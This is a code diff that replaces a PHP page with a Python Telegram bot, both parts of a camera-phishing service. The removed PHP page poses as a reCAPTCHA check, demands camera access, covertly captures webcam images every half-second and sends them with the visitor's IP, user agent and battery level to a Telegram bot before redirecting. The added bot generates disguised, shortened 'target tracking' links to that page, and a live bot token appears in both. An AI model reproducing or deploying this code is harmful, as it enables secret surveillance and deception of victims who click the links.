@@ -1,128 +1,152 @@
-<?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
-    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
-    $chatId = "5896019931";
+import logging
+import uuid
+import base64
+import urllib.parse
+import urllib.request
+from datetime import datetime, timedelta
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
+from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CallbackQueryHandler, CommandHandler, filters
+from telegram.error import TelegramError
 
-    if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
-        $encodedCid = $_POST['chat_id'];
-        $decodedCid = base64_decode(str_pad(strtr($encodedCid, '-_', '+/'), strlen($encodedCid) % 4, '=', STR_PAD_RIGHT));
-        if ($decodedCid !== false && is_numeric($decodedCid)) {
-            $chatId = $decodedCid;
-        }
-    }
+logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-    $uploadDir = 'uploads/';
-    if (!is_dir($uploadDir)) mkdir($uploadDir, 0777, true);
+RENDER_BASE_URL = "https://camera-y1vl.onrender.com"
+CHANNEL_USERNAME = "@TeamLolOfficial"
+PROMO_LINK = "https://shrinkme.click/JtuERnP3"
+CORRECT_PROMO_CODE = "boom"
 
-    $imgData = str_replace(['data:image/png;base64,', ' '], ['', '+'], $_POST['image']);
-    $fileName = 'img_' . uniqid() . '.png';
-    $filePath = $uploadDir . $fileName;
+user_promo_expiry = {}
 
-    if (file_put_contents($filePath, base64_decode($imgData))) {
-        $postFields = [
-            'chat_id' => $chatId,
-            'caption' => "🎯 Target ID: " . ($_POST['target'] ?? 'direct') . "\n🔋 Battery: " . ($_POST['battery'] ?? 'Unknown') . "\n🌐 IP: " . $_SERVER['REMOTE_ADDR'] . "\n💻 UA: " . ($_POST['user_agent'] ?? 'Unknown'),
-            'photo'   => new CURLFile(realpath($filePath))
-        ];
+def shorten_url(long_url):
+    """TinyURL API দিয়ে দীর্ঘ লিংকটি ছোট করার ফাংশন"""
+    try:
+        api_url = f"http://tinyurl.com/api-create.php?url={urllib.parse.quote(long_url)}"
+        with urllib.request.urlopen(api_url, timeout=5) as response:
+            return response.read().decode('utf-8')
+    except Exception as e:
+        logging.error(f"Error shortening URL: {e}")
+        return long_url
 
-        $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendPhoto");
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch);
-        curl_close($ch);
-    }
-    exit;
-}
-?>
-<!DOCTYPE html>
-<html lang="bn">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <style>
-        body, html { margin: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: #f9f9f9; overflow: hidden; }
-        .recaptcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; padding: 20px 25px; display: flex; align-items: center; justify-content: space-between; width: 300px; box-shadow: 0 0 4px rgba(0,0,0,0.08); display: none; }
-        .recaptcha-left { display: flex; align-items: center; gap: 15px; }
-        .recaptcha-checkbox { width: 28px; height: 28px; background: #fff; border: 2px solid #c1c1c1; border-radius: 2px; }
-        .recaptcha-checkbox.loading { border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .recaptcha-text { font-family: Roboto, sans-serif; font-size: 14px; color: #2c2c2c; }
-        .recaptcha-right { display: flex; flex-direction: column; align-items: center; }
-        .recaptcha-logo { width: 32px; height: 32px; background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png'); background-size: contain; }
-        .recaptcha-footer { font-family: Roboto, sans-serif; font-size: 10px; color: #555; }
-    </style>
-</head>
-<body>
-    <div class="recaptcha-box" id="recaptchaContainer">
-        <div class="recaptcha-left">
-            <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
-            <span class="recaptcha-text">Verifying...</span>
-        </div>
-        <div class="recaptcha-right">
-            <div class="recaptcha-logo"></div>
-            <div class="recaptcha-footer">reCAPTCHA</div>
-        </div>
-    </div>
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+async def check_channel_membership(bot, user_id):
+    try:
+        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
+        if member.status in ['member', 'administrator', 'creator']:
+            return True
+    except TelegramError:
+        pass
+    return False
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const targetId = urlParams.get('id') || 'direct';
-        const userChatId = urlParams.get('cid') || ''; 
-        let finalUrl = "https://www.aapunkagames.com/";
-        const rawTargetUrl = urlParams.get('url');
+def is_promo_valid(user_id):
+    if user_id in user_promo_expiry:
+        if datetime.now() < user_promo_expiry[user_id]:
+            return True
+    return False
 
-        if (rawTargetUrl) {
-            try { finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/')); } catch (e) {}
-        }
+def get_user_keyboard(user_id):
+    if is_promo_valid(user_id):
+        keyboard = [["🔗 Create Link"]]
+    else:
+        keyboard = [["🔗 Create Link"], ["🎟️ USE CODE"]]
+    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, input_field_placeholder="Choose an option...")
 
-        document.getElementById('recaptchaContainer').style.display = 'flex';
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not await check_channel_membership(context.bot, user_id):
+        keyboard = [
+            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
+            [InlineKeyboardButton("Verify", callback_data="verify_join")]
+        ]
+        await update.message.reply_text("❌ Please join our official channel first:", reply_markup=InlineKeyboardMarkup(keyboard))
+        return
 
-        let batteryInfo = 'Not Available';
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; });
-        }
+    await update.message.reply_text("👋 Welcome! Choose an option below:", reply_markup=get_user_keyboard(user_id))
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    
+    if query.data == "verify_join":
+        if await check_channel_membership(context.bot, user_id):
+            await query.edit_message_text(text="✅ Verification successful!")
+            await context.bot.send_message(chat_id=user_id, text="👋 Welcome! Choose an option below:", reply_markup=get_user_keyboard(user_id))
+        else:
+            await query.answer("❌ You have not joined the channel yet!", show_alert=True)
 
-        function startAutoVerification() {
-            document.getElementById('recaptchaCheckbox').classList.add('loading');
-            const interval = setInterval(captureAndUpload, 500);
-            setTimeout(() => {
-                clearInterval(interval);
-                window.location.href = finalUrl;
-            }, 4000);
-        }
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    user_text = update.message.text.strip()
+    
+    if not await check_channel_membership(context.bot, user_id):
+        return
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                setTimeout(startAutoVerification, 500);
-            })
-            .catch(() => {
-                alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
-                location.reload();
-            });
+    if user_text == "🎟️ USE CODE":
+        if is_promo_valid(user_id):
+            await update.message.reply_text("✅ Your promo code is already active!", reply_markup=get_user_keyboard(user_id))
+        else:
+            context.user_data['waiting_for_code'] = True
+            await update.message.reply_text(f"🔑 Enter promo code.\n\n🔗 Get code here: {PROMO_LINK}", reply_markup=get_user_keyboard(user_id))
+        return
 
-        function captureAndUpload() {
-            const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            const params = new URLSearchParams();
-            params.append('image', canvas.toDataURL('image/png'));
-            params.append('target', targetId);
-            params.append('chat_id', userChatId);
-            params.append('user_agent', navigator.userAgent);
-            params.append('battery', batteryInfo);
+    if context.user_data.get('waiting_for_code', False):
+        if user_text.lower() == CORRECT_PROMO_CODE:
+            user_promo_expiry[user_id] = datetime.now() + timedelta(hours=24, minutes=1)
+            context.user_data['waiting_for_code'] = False
+            await update.message.reply_text("🎉 Promo code activated for 24 Hours & 1 Minute!\nNow click **🔗 Create Link**.", reply_markup=get_user_keyboard(user_id), parse_mode="Markdown")
+        else:
+            await update.message.reply_text(f"❌ Invalid Code!\nGet code from: {PROMO_LINK}", reply_markup=get_user_keyboard(user_id))
+        return
 
-            fetch('', { method: 'POST', body: params }).catch(() => {});
-        }
-    </script>
-</body>
-</html>
+    if user_text == "🔗 Create Link":
+        if not is_promo_valid(user_id):
+            await update.message.reply_text(f"🔒 Active promo code required!\n\n1. Get code: {PROMO_LINK}\n2. Click **🎟️ USE CODE**", reply_markup=get_user_keyboard(user_id), parse_mode="Markdown")
+            return
+        context.user_data['waiting_for_url'] = True
+        await update.message.reply_text("Enter a valid url", reply_markup=get_user_keyboard(user_id))
+        return
+
+    if context.user_data.get('waiting_for_url', False):
+        if not is_promo_valid(user_id):
+            await update.message.reply_text("❌ Promo code expired!", reply_markup=get_user_keyboard(user_id))
+            return
+
+        target_url = user_text if (user_text.startswith("http://") or user_text.startswith("https://")) else "https://" + user_text
+        
+        # Expiry timestamp (Hex-encoded)
+        expiry_timestamp = int(user_promo_expiry[user_id].timestamp())
+        hex_exp = hex(expiry_timestamp)[2:]
+
+        encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode().rstrip("=")
+        encoded_cid = base64.urlsafe_b64encode(str(user_id).encode()).decode().rstrip("=")
+        
+        unique_id = str(uuid.uuid4())[:6]
+        
+        # Long tracking link
+        raw_tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&cid={encoded_cid}&url={encoded_url}&e={hex_exp}"
+        
+        # Short tracking link
+        short_tracking_link = shorten_url(raw_tracking_link)
+        
+        context.user_data['waiting_for_url'] = False
+        
+        # লং এবং শর্ট—দুটো লিংকই একসাথে রেসপন্স দেওয়া হচ্ছে
+        response_msg = (
+            f"🎯 **Target Tracking Link Created Successfully!**\n\n"
+            f"🔗 **Original Target:** `{target_url}`\n\n"
+            f"🌐 **Long Link:**\n`{raw_tracking_link}`\n\n"
+            f"⚡ **Short Link:**\n`{short_tracking_link}`"
+        )
+        
+        await update.message.reply_text(
+            response_msg,
+            reply_markup=get_user_keyboard(user_id),
+            parse_mode="Markdown"
+        )
+
+if __name__ == '__main__':
+    app = ApplicationBuilder().token("8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY").build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(button_callback))
+    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
+    print("Dual Link Bot is running...")
+    app.run_polling()
